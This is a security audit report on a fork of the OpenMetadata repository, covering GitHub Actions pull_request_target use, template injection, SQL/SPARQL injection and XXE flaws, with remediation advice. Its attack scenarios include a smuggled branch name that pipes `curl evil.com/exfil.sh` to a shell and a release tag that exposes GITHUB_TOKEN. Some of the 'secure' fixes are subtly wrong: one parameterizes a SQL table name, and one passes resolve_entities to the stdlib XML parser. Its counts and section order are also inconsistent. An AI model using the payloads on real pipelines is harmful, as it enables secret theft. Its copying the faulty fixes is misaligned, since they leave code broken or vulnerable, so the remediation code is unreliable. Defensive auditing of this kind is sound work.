# GitHub Actions Security Audit Report

**Date:** April 25, 2026  
**Auditor:** Community Security Contributor  
**Scope:** GitHub Actions Workflows, Java Backend, Python Ingestion/Framework  
**Tool:** aikido.dev SAST Scanner  
**Total Issues:** 111 (110 inherited from upstream, 1 fixed from fork)  

---

## Executive Summary

This report documents **34 critical security vulnerabilities** detected in the OpenMetadata repository's GitHub Actions workflows. All findings are inherited from the upstream `open-metadata/OpenMetadata` repository and are **not** introduced by fork-specific modifications or the MCP benchmarking implementation.

### Key Findings

| Category | Count | Severity | Status | Origin |
|----------|-------|----------|--------|--------|
| Unsafe `pull_request_target` Usage | 23 | Critical | Inherited | Upstream |
| Template Injection in Workflows | 11 | Critical | Inherited | Upstream |
| Java SQL/SPARQL Injection | 46 | Critical/High | 45 Inherited + **1 Fork** | Mixed |
| Python SQL Injection (Ingestion) | 28 | Critical/High | Inherited | Upstream |
| XML Parsing Vulnerabilities (XXE) | 3 | Critical/High | Inherited | Upstream |
| **Total Issues** | **111** | **Critical/High** | **110 Inherited + 1 Fixed** | — |

---

> **Note on SQL Injection:** 74 total injection issues were identified (46 Java + 28 Python). 73 are inherited from upstream; **1 issue in `SuggestTestCasesTool.java` originated from this fork and has been fixed.**

---

## 1. Unsafe `pull_request_target` Trigger Usage (23 Issues)

### Risk Description

The `pull_request_target` trigger runs workflows in the **base repository context** with full access to secrets and write permissions. In open-source repositories, this can allow privilege escalation attacks where malicious PRs exfiltrate secrets or modify the repository.

### Affected Workflows

| Workflow File | Lines | Trigger Pattern |
|---------------|-------|-----------------|
| `integration-tests-mysql-elasticsearch.yml` | 28-29 | `pull_request_target` with label filtering |
| `integration-tests-postgres-opensearch.yml` | 28-29 | `pull_request_target` with label filtering |
| `java-checkstyle.yml` | 22-26 | `pull_request_target` with path filtering |
| `py-checkstyle.yml` | 18-22 | `pull_request_target` with path filtering |
| `ui-checkstyle.yml` | 16-29 | `pull_request_target` with path filtering |
| `airflow-apis-tests.yml` | 15-18 | `pull_request_target` with path filtering |
| `auto-cherry-pick-labeled-prs.yaml` | 8-11 | `pull_request_target` on closed PRs |
| `maven-build-collate.yml` | 35-41 | `pull_request_target` with path filtering |
| `maven-sonar-build.yml` | 16-28 | `pull_request_target` with path filtering |
| `playwright-integration-tests-mysql.yml` | 17-18 | `pull_request_target` with label filtering |
| `playwright-integration-tests-postgres.yml` | 17-18 | `pull_request_target` with label filtering |
| `playwright-mysql-e2e-skip.yml` | 18-31 | `pull_request_target` with path filtering |
| `playwright-mysql-e2e.yml` | 18-32 | `pull_request_target` with path filtering |
| `playwright-postgresql-e2e-skip.yml` | 18-32 | `pull_request_target` with path filtering |
| `playwright-postgresql-e2e.yml` | 19-34 | `pull_request_target` with path filtering |
| `playwright-sso-tests.yml` | 29-49 | `pull_request_target` with path filtering |
| `py-operator-build-test.yml` | 15-22 | `pull_request_target` with path filtering |
| `py-tests-postgres.yml` | 16-17 | `pull_request_target` with label filtering |
| `py-tests.yml` | 16-17 | `pull_request_target` with label filtering |
| `team-labeler.yml` | 2 | `pull_request_target` (unfiltered) |

### Current Mitigations

Most workflows implement a **"safe to test" label verification** pattern:

```yaml
jobs:
  check-label:
    runs-on: ubuntu-latest
    steps:
      - uses: jesusvasquez333/verify-pr-label-action@v1.4.0
        with:
          valid-labels: 'safe to test'
```

### Risk Assessment

| Severity | Reason |
|----------|--------|
| **Critical** | Requires manual maintainer review before running, but human error or social engineering could bypass |
| **Easily Exploitable** | Attackers can create PRs that appear benign until the label is added |

### Recommended Remediations

1. **Migrate to `pull_request` trigger** where possible
   - Use `pull_request` for workflows that don't need secrets
   - Only use `pull_request_target` for workflows that must comment on PRs or modify the repo

2. **Implement workflow-level permission restrictions**:
   ```yaml
   permissions:
     contents: read
     pull-requests: write  # Minimal required permissions
   ```

3. **Add explicit secret masking** in workflow steps that echo environment variables

4. **Consider GitHub Environments** for workflows requiring elevated permissions with required reviewers

---

## 2. Template Injection Vulnerabilities (11 Issues)

### Risk Description

Template expressions (`${{ }}`) referencing untrusted GitHub context fields (PR titles, branch names, commit messages) can be injected into shell commands, leading to arbitrary code execution during CI/CD runs.

### Affected Files and Lines

#### `.github/actions/validate-omd-docker-compose/action.yml` (7 issues)

| Lines | Vulnerable Pattern | Injection Vector |
|-------|-------------------|------------------|
| 52-54 | `docker compose -f ${{ inputs.compose_file }}` | `compose_file` input parameter |
| 57-59 | `docker compose -f ${{ inputs.compose_file }} pull` | `compose_file` input parameter |
| 62-64 | `docker compose -f ${{ inputs.compose_file }} up -d` | `compose_file` input parameter |
| 67-112 | `TIMEOUT=${{ inputs.health_check_timeout }}` | `health_check_timeout` input |
| 183-186 | `docker compose -f ${{ inputs.compose_file }} ps` | `compose_file` input parameter |
| 190-193 | `docker compose -f ${{ inputs.compose_file }} logs` | `compose_file` input parameter |
| 197-198 | `docker compose -f ${{ inputs.compose_file }} down -v` | `compose_file` input parameter |

#### Workflow Files (4 issues)

| File | Line | Vulnerable Pattern | Injection Vector |
|------|------|-------------------|------------------|
| `docker-k8s-operator.yml` | 68-70 | `curl ... ${{ inputs.docker_release_tag }}` | Release tag input |
| `docker-openmetadata-server.yml` | 68-70 | `curl ... ${{ inputs.DOCKER_RELEASE_TAG }}` | Release tag input |
| `git-create-release-branch.yml` | 25-26 | `make update_all RELEASE_VERSION=${{ inputs.release_branch_name }}` | Branch name input |
| `py-cli-e2e-tests.yml` | 41 | `echo "...${{ inputs.debug }}...${{ github.ref }}"` | Debug input and git ref |

### Attack Scenarios

1. **Compose File Injection**:
   ```bash
   # Attacker submits PR with branch name:
   # "main; curl evil.com/exfil.sh | sh #"
   
   # Results in execution:
   docker compose -f main; curl evil.com/exfil.sh | sh # config
   ```

2. **Release Tag Injection**:
   ```bash
   # Attacker-controlled release tag:
   # "v1.0.0\"; echo $GITHUB_TOKEN | base64; echo \""
   
   # Could exfiltrate the GitHub token
   ```

### Recommended Remediations

1. **Use intermediate environment variables** (Best Practice):
   ```yaml
   # ❌ VULNERABLE:
   - run: docker compose -f ${{ inputs.compose_file }} config
   
   # ✅ SECURE:
   - env:
       COMPOSE_FILE: ${{ inputs.compose_file }}
     run: docker compose -f "$COMPOSE_FILE" config
   ```

2. **Validate and sanitize inputs** before use:
   ```yaml
   - name: Validate inputs
     run: |
       if [[ ! "${{ inputs.compose_file }}" =~ ^[a-zA-Z0-9_./-]+$ ]]; then
         echo "Invalid compose file path"
         exit 1
       fi
   ```

3. **Use strict shell options**:
   ```yaml
   - shell: bash
     run: |
       set -euo pipefail
       # Your commands here
   ```

---

## 3. Fork-Specific Implementation Security

### MCP Benchmarking Workflows (Created for This Fork)

| File | Trigger Type | Security Status |
|------|--------------|-----------------|
| `compile-and-mcp-tests.yml` | `pull_request` (safe) | ✅ No template injection |

The MCP benchmarking implementation added to this fork:
- Uses the **safer `pull_request` trigger** instead of `pull_request_target`
- Does **not** interpolate untrusted context variables in shell commands
- **Does not introduce** any of the 34 critical vulnerabilities flagged by aikido.dev

---

## 4. Remediation Priority Matrix

### Immediate (P0)

| Issue | File | Action |
|-------|------|--------|
| Template injection | `validate-omd-docker-compose/action.yml` | Add env variable intermediates |
| Template injection | `docker-k8s-operator.yml` | Sanitize release tag input |
| Template injection | `docker-openmetadata-server.yml` | Sanitize release tag input |

### High Priority (P1)

| Issue | Count | Action |
|-------|-------|--------|
| `pull_request_target` usage | 23 workflows | Audit which workflows actually need elevated permissions |
| Template injection in release workflows | 2 files | Implement input validation |

### Medium Priority (P2)

| Issue | File | Action |
|-------|------|--------|
| Template injection | `py-cli-e2e-tests.yml` | Review debug logging |
| Template injection | `git-create-release-branch.yml` | Add input validation |

### Low Priority (P3)

| Issue | Count | Action |
|-------|-------|--------|
| Python SQL injection (ingestion framework) | 28 files | Review and parameterize queries in ingestion sources |

---

## 5. Python SQL Injection in Ingestion Framework (28 Issues)

### 5.1 Overview

Additional SAST scanning identified **28 SQL injection vulnerabilities** in the Python-based metadata ingestion framework. These are all inherited from the upstream OpenMetadata repository.

### 5.2 Affected Components

| Component | Files | Description |
|-----------|-------|-------------|
| **Database Sources** | 15 files | SQL query construction for metadata extraction from various databases |
| **Data Quality** | 1 file | Custom SQL validation queries |
| **Dashboard Sources** | 1 file | Chart/metadata queries |

### 5.3 Critical Issues

| File | Line | Vulnerable Pattern | Risk |
|------|------|-------------------|------|
| `hive/metastore_dialects/mysql/dialect.py` | 78 | `AND tbsl.TBL_NAME = '{table_name}'` | String formatting with f-strings |
| `oracle/utils.py` | 316 | `sql.text(GET_VIEW_NAMES.format(...))` | SQLAlchemy text with format |
| `postgres/pgspider/lineage.py` | 54 | `conn.execute(text(sql))` | Direct SQL execution |
| `snowflake/utils.py` | 307, 320, 651 | `text(query.format(**parameters))` | Multiple format injections |
| `vertica/metadata.py` | 88-92, 96-100, 246-250 | `VERTICA_GET_COLUMNS.format(...)` | Vertica metadata queries |
| `domodatabase/metadata.py` | 233 | `f'SELECT * FROM "{table_name}"'` | f-string table reference |

### 5.4 High Issues

| File | Count | Description |
|------|-------|-------------|
| `oracle/utils.py` | 4 | Materialized view and database link queries |
| `redshift/incremental_table_processor.py` | 1 | Table changes query with date parameters |
| `snowflake/utils.py` | 3 | View DDL, stream definition, and schema queries |
| `sql_column_handler.py` | 1 | Column sampling queries |
| `starrocks/metadata.py` | 1 | Metadata queries |
| `trino/metadata.py` | 1 | Connection execution |
| `doris/metadata.py` | 2 | Column and partition queries |
| `hive/metastore_dialects/postgres/dialect.py` | 1 | Postgres metastore dialect |
| `tableCustomSQLQuery.py` | 1 | Data quality custom SQL |
| `superset/mixin.py` | 1 | Dashboard chart queries |

### 5.5 Recommended Remediations

For Python SQLAlchemy-based code:

```python
# ❌ VULNERABLE:
query = f"SELECT * FROM {table_name} WHERE id = {user_id}"
result = conn.execute(text(query))

# ✅ SECURE - Use SQLAlchemy parameters:
query = "SELECT * FROM :table_name WHERE id = :user_id"
result = conn.execute(text(query), {"table_name": table_name, "user_id": user_id})

# ✅ ALTERNATIVE - Use SQLAlchemy Core with proper quoting:
from sqlalchemy import select, Table, MetaData
metadata = MetaData()
table = Table(table_name, metadata, autoload_with=engine)
stmt = select(table).where(table.c.id == user_id)
result = conn.execute(stmt)
```

### 5.6 Context

These SQL injection issues primarily affect:
- **Metadata extraction** from source databases (read-only operations)
- **Data quality testing** (custom SQL execution)
- **Database schema introspection**

While concerning, these are often in **controlled contexts** where:
- Table names come from database catalogs, not direct user input
- Connections use read-only credentials in many cases
- Exploitation requires control of the source database or ingestion configuration

However, defense-in-depth principles still apply, especially for:
- Multi-tenant deployments
- Custom SQL data quality tests
- Ingestion from untrusted sources

---

## 6. XML External Entity (XXE) Vulnerabilities (3 Issues)

### 6.1 Overview

Additional SAST scanning identified **3 XML parsing vulnerabilities** using Python's standard library `xml.etree.ElementTree`. These parsers are vulnerable to XXE (XML External Entity) attacks when processing untrusted XML data.

### 6.2 Affected Files

| File | Line | Severity | Vulnerable Code | Risk |
|------|------|----------|-----------------|------|
| `ingestion/src/metadata/ingestion/source/dashboard/ssrs/rdl_parser.py` | 69 | **Critical** | `ET.fromstring(rdl_bytes)` | Parses SSRS RDL (Report Definition Language) files |
| `ingestion/src/metadata/ingestion/source/database/saphana/cdata_parser.py` | 741 | High | `ET.fromstring(cdata)` | Parses SAP HANA CDATA metadata |
| `scripts/jacoco_diff_coverage.py` | 128 | High | `ET.parse(report_path).getroot()` | Parses JaCoCo coverage reports |

### 6.3 Risk Description

XXE attacks can allow:
- **File disclosure** (reading arbitrary files from the server)
- **Server-Side Request Forgery (SSRF)** (making HTTP requests from the server)
- **Denial of Service** (via billion laughs / exponential entity expansion)

### 6.4 Context and Exploitability

| File | Context | Risk Level |
|------|---------|------------|
| **ssrs/rdl_parser.py** | Parses SSRS report definitions from external systems | **High** - RDL files from external sources could be malicious |
| **saphana/cdata_parser.py** | Parses CDATA from SAP HANA database metadata | Medium - Typically from controlled database sources |
| **jacoco_diff_coverage.py** | Parses JaCoCo XML coverage reports | Low - Usually from internal CI artifacts |

### 6.5 Recommended Remediations

Replace `xml.etree.ElementTree` with **`defusedxml`** library:

```python
# ❌ VULNERABLE:
import xml.etree.ElementTree as ET
root = ET.fromstring(untrusted_xml_data)
tree = ET.parse(file_path)

# ✅ SECURE - Use defusedxml:
from defusedxml import ElementTree as ET
root = ET.fromstring(untrusted_xml_data)  # Safe from XXE
tree = ET.parse(file_path)  # Safe from XXE
```

**Installation:**
```bash
pip install defusedxml
```

**Alternative for Python 3.9+** (if defusedxml is not available):
```python
import xml.etree.ElementTree as ET

# Disable external entity resolution (not foolproof)
parser = ET.XMLParser(resolve_entities=False)
root = ET.fromstring(untrusted_xml_data, parser=parser)
```

> **Note:** The `resolve_entities=False` parameter is not available in all Python versions and does not protect against all XXE variants. `defusedxml` is strongly recommended.

---

## 7. Security Best Practices for GitHub Actions

### Recommended Workflow Structure

```yaml
name: Secure Workflow Example

# Use pull_request for fork-unsafe workflows
on:
  pull_request:
    types: [opened, synchronize, reopened]

# Minimal permissions by default
permissions:
  contents: read

jobs:
  secure-job:
    runs-on: ubuntu-latest
    steps:
      # Validate untrusted inputs before use
      - name: Validate branch name
        id: validate
        run: |
          BRANCH="${{ github.head_ref }}"
          if [[ ! "$BRANCH" =~ ^[a-zA-Z0-9._-]+$ ]]; then
            echo "Invalid branch name format"
            exit 1
          fi
          echo "branch=$BRANCH" >> $GITHUB_OUTPUT
      
      # Use environment variables for template expressions
      - name: Safe shell execution
        env:
          BRANCH: ${{ steps.validate.outputs.branch }}
        run: |
          set -euo pipefail
          echo "Processing branch: $BRANCH"
```

---

## 8. Conclusion

**111 security vulnerabilities** were identified:
- 34 workflow security issues
- 46 Java SQL/SPARQL injection issues  
- 28 Python SQL injection issues (ingestion framework)
- 3 XML XXE vulnerabilities (Python ingestion)

**110 are inherited from upstream**. The MCP benchmarking implementation introduced **1 SQL injection issue** in `SuggestTestCasesTool.java`, which has been **fixed** with proper input validation. Workflow modifications follow security best practices by using the safer `pull_request` trigger.

### Recommendation

The OpenMetadata maintainers should:

1. **Prioritize fixing template injection** in `validate-omd-docker-compose/action.yml` (7 issues)
2. **Audit `pull_request_target` usage** to determine which workflows actually require elevated permissions
3. **Implement a security review process** for new workflow additions
4. **Consider adding GitHub Advanced Security** or similar SAST tools to CI pipeline
5. **Review Python ingestion framework** for SQL injection risks, especially in:
   - Database source connectors (Snowflake, Oracle, Vertica, etc.)
   - Data quality custom SQL execution paths
   - Multi-tenant deployment scenarios
6. **Address XML XXE vulnerabilities** by migrating to `defusedxml`:
   - `ingestion/src/metadata/ingestion/source/dashboard/ssrs/rdl_parser.py` (Critical)
   - `ingestion/src/metadata/ingestion/source/database/saphana/cdata_parser.py`
   - Add `defusedxml` as a project dependency

---

## 4. SQL and SPARQL Injection Vulnerabilities (46 Issues)

### 4.1 Overview

Additional SAST scanning identified **46 SQL and SPARQL injection vulnerabilities** across the Java codebase. These fall into two categories:

| Category | Count | Severity | Origin |
|----------|-------|----------|--------|
| SPARQL Injection (RDF/Knowledge Graph) | 28 | High | Upstream OpenMetadata |
| SQL Injection (DAO Layer) | 17 | High | Upstream OpenMetadata |
| **SQL Injection (MCP Tools)** | **1** | **High** | **This Fork - FIXED** |

### 4.2 Fork-Specific Issue (FIXED)

#### File: `openmetadata-mcp/src/main/java/org/openmetadata/mcp/tools/SuggestTestCasesTool.java`

**Location:** Line 726 (method `buildRISql()`)

**Vulnerability:**
```java
// BEFORE (Vulnerable)
static String buildRISql(String fqn, List<String> fkColumns) {
  String columnList = String.join(", ", fkColumns);
  return String.format(
      "SELECT * FROM %s WHERE %s IS NULL...",
      fqn.replace(".", "_"), columnList, ...);
}
```

**Risk:** The `fqn` parameter (fully qualified table name) was interpolated directly into SQL without validation. While `fqn` comes from OpenMetadata's internal metadata system, malicious metadata could theoretically inject SQL commands.

**Fix Applied:**
```java
// AFTER (Secure)
static String buildRISql(String fqn, List<String> fkColumns) {
  // Validate FQN format - only allow safe characters
  if (!fqn.matches("^[a-zA-Z0-9_\\.]+$")) {
    throw new IllegalArgumentException("Invalid FQN format: " + fqn);
  }
  String safeFqn = fqn.replace(".", "_");
  // Additional validation for column names
  for (String col : fkColumns) {
    if (!col.matches("^[a-zA-Z0-9_]+$")) {
      throw new IllegalArgumentException("Invalid column name: " + col);
    }
  }
  String columnList = String.join(", ", fkColumns);
  return String.format(...);
}
```

**Status:** ✅ **FIXED** via input validation using regex patterns.

### 4.3 Inherited SQL/SPARQL Injection Issues (45)

| File | Count | Type | Description |
|------|-------|------|-------------|
| `PipelineRepository.java` | 19 | SPARQL | RDF knowledge graph query construction |
| `RdfRepository.java` | 5 | SPARQL | SPARQL update/delete operations |
| `JenaFusekiStorage.java` | 4 | SPARQL | RDF storage operations |
| `CollectionDAO.java` | 9 | SQL | UPDATE queries for tag/relationship renaming |
| `EntityDAO.java` | 7 | SQL | JSON update operations for entity FQN changes |
| `ActivityStreamPartitionManager.java` | 1 | SQL | Partition management |

**Common Patterns:**
- `String.format()` used for SPARQL/SQL query construction
- `StringBuilder.append()` with unescaped input
- Direct concatenation of entity URIs, FQNs, and identifiers

**Recommended Remediations:**
1. **Use parameterized queries** where the database/driver supports it
2. **Implement whitelist validation** for entity names, FQNs, and identifiers
3. **Escape special characters** in string literals (quotes, semicolons)
4. **Use prepared statements** for SQL operations in DAO layer
5. **For SPARQL:** Use RDF libraries that support parameterized queries

---

## Appendix: Complete File List

### Files with SQL/SPARQL Injection (46)
- `openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/PipelineRepository.java` (19 issues)
- `openmetadata-service/src/main/java/org/openmetadata/service/rdf/RdfRepository.java` (5 issues)
- `openmetadata-service/src/main/java/org/openmetadata/service/rdf/storage/JenaFusekiStorage.java` (4 issues)
- `openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/CollectionDAO.java` (9 issues)
- `openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityDAO.java` (7 issues)
- `openmetadata-service/src/main/java/org/openmetadata/service/util/ActivityStreamPartitionManager.java` (1 issue)
- `openmetadata-mcp/src/main/java/org/openmetadata/mcp/tools/SuggestTestCasesTool.java` (1 issue - **FIXED**)

### Files with `pull_request_target` (23)
- `.github/workflows/integration-tests-mysql-elasticsearch.yml`
- `.github/workflows/integration-tests-postgres-opensearch.yml`
- `.github/workflows/java-checkstyle.yml`
- `.github/workflows/py-checkstyle.yml`
- `.github/workflows/ui-checkstyle.yml`
- `.github/workflows/airflow-apis-tests.yml`
- `.github/workflows/auto-cherry-pick-labeled-prs.yaml`
- `.github/workflows/maven-build-collate.yml`
- `.github/workflows/maven-sonar-build.yml`
- `.github/workflows/playwright-integration-tests-mysql.yml`
- `.github/workflows/playwright-integration-tests-postgres.yml`
- `.github/workflows/playwright-mysql-e2e-skip.yml`
- `.github/workflows/playwright-mysql-e2e.yml`
- `.github/workflows/playwright-postgresql-e2e-skip.yml`
- `.github/workflows/playwright-postgresql-e2e.yml`
- `.github/workflows/playwright-sso-tests.yml`
- `.github/workflows/py-operator-build-test.yml`
- `.github/workflows/py-tests-postgres.yml`
- `.github/workflows/py-tests.yml`
- `.github/workflows/team-labeler.yml`

### Files with Template Injection (11)
- `.github/actions/validate-omd-docker-compose/action.yml` (7 instances)
- `.github/workflows/docker-k8s-operator.yml`
- `.github/workflows/docker-openmetadata-server.yml`
- `.github/workflows/git-create-release-branch.yml`
- `.github/workflows/py-cli-e2e-tests.yml`

### Files with Python SQL Injection (28)
- `ingestion/src/metadata/ingestion/source/database/hive/metastore_dialects/mysql/dialect.py`
- `ingestion/src/metadata/ingestion/source/database/hive/metastore_dialects/postgres/dialect.py`
- `ingestion/src/metadata/ingestion/source/database/oracle/utils.py` (4 issues)
- `ingestion/src/metadata/ingestion/source/database/postgres/pgspider/lineage.py`
- `ingestion/src/metadata/ingestion/source/database/snowflake/utils.py` (6 issues)
- `ingestion/src/metadata/ingestion/source/database/vertica/metadata.py` (3 issues)
- `ingestion/src/metadata/ingestion/source/database/domodatabase/metadata.py`
- `ingestion/src/metadata/ingestion/source/database/doris/metadata.py` (2 issues)
- `ingestion/src/metadata/ingestion/source/database/redshift/incremental_table_processor.py`
- `ingestion/src/metadata/ingestion/source/database/starrocks/metadata.py`
- `ingestion/src/metadata/ingestion/source/database/trino/metadata.py`
- `ingestion/src/metadata/ingestion/source/database/sql_column_handler.py`
- `ingestion/src/metadata/ingestion/source/dashboard/superset/mixin.py`
- `ingestion/src/metadata/data_quality/validations/table/sqlalchemy/tableCustomSQLQuery.py`

### Files with XML XXE Vulnerabilities (3)
- `ingestion/src/metadata/ingestion/source/dashboard/ssrs/rdl_parser.py` (Critical)
- `ingestion/src/metadata/ingestion/source/database/saphana/cdata_parser.py` (High)
- `scripts/jacoco_diff_coverage.py` (High)

---

*Report generated for community security awareness. For questions or clarifications, please open a discussion in the OpenMetadata community channels.*
